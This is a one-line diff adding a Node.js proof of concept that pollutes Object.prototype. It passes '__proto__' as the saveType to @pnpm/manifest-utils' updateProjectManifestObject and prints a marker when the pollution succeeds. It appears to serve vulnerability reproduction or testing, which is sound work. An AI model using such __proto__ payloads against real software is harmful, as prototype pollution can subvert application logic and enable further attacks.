@@ -1,0 +1,1 @@
+require("@pnpm/manifest-utils").updateProjectManifestObject('prefix', {}, [{saveType: '__proto__', alias: 'polluted', pref: 'value'}]); console.log({}.polluted !== undefined ? '[POLLUTION_TRIGGERED]':'');
